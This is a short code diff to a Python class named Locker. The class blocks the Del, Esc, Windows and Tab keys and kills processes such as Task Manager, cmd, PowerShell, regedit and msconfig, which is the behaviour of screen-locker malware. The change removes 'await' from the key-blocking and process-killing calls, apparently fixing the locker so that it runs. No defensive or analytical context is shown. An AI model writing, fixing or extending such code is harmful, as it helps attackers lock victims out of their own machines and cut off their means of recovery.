@@ -37,14 +37,14 @@ class Locker:
     async def block_button(self):
         buttons = ['Del', 'Esc', 'Windows', 'Tab']
         for button in buttons:
-            await block_key(button)
+            block_key(button)
 
     async def block_process(self):
         processing = ['taskmgr.exe', 'cmd.exe', 'powershell.exe', 'powershell_ise.exe', 'regedit.exe', 'msconfig.exe',
                       'ProcessHacker.exe', 'iexplore.exe', 'game.exe', 'SystemSettings.exe']
         for process in process_iter():
             if process.name() in processing:
-                await process.kill()
+                process.kill()
 
     async def main(self):
         coro_list = [self.close(), self.block_button(), self.block_process()]
